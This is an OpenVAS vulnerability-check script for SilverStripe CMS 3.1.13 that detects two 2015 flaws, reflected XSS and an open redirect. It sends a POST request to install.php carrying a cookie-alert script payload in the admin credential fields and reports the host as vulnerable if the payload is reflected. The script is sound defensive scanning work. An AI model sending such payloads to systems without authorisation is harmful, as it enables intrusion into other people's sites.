###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_silverstripe_cms_mult_vuln_jun15.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# SilverStripe CMS Multiple Vulnerabilities - June15
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805592");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2015-5063", "CVE-2015-5062");
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-06-22 12:00:20 +0530 (Mon, 22 Jun 2015)");
  script_name("SilverStripe CMS Multiple Vulnerabilities - June15");

  script_tag(name:"summary", value:"This host is installed with SilverStripe CMS
  and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple flaws exists due to,

  - Insufficient validation of input passed via 'admin_username' and
  'admin_password' POST parameter to install.php script.

  - Application does not validate the 'returnURL' GET parameter upon submission
  to the /dev/build script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to create a specially crafted URL, that if clicked, would redirect
  a victim from the intended legitimate web site to an arbitrary web site of the
  attacker's choosing, and execute arbitrary HTML and script code in the context
  of an affected site.");

  script_tag(name:"affected", value:"SilverStripe CMS version 3.1.13");

  script_tag(name:"solution", value:"Upgrade to SilverStripe CMS version 3.1.14
  or later.");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2015/Jun/44");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/132223");
  script_xref(name:"URL", value:"http://hyp3rlinx.altervista.org/advisories/AS-SILVERSTRIPE0607.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_xref(name:"URL", value:"http://www.silverstripe.com");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

host = http_host_name( port:http_port );

foreach dir (make_list_unique("/", "/Silverstripe-cms", "/Silverstripe", "/cms", cgi_dirs( port:http_port)))
{

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"),  port:http_port);

  if("<title>Home" >< rcvRes && 'content="SilverStripe' >< rcvRes)
  {

    url = dir + "/install.php";
    postData = 'admin[username]="><script>alert(document.cookie)</script>&ad' +
               'min[password]="><script>alert(document.cookie)</script>';

    sndReq =  string('POST ', url, ' HTTP/1.1\r\n',
                   'Host: ', host, '\r\n',
                   'Accept-Encoding: gzip,deflate\r\n',
                   'Content-Type: application/x-www-form-urlencoded\r\n',
                   'Content-Length: ', strlen(postData), '\r\n\r\n',
                    postData);

    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

    if(rcvRes =~ "HTTP/1\.. 200" && "><script>alert(document.cookie)</script>" >< rcvRes
              && "<title>SilverStripe CMS" >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
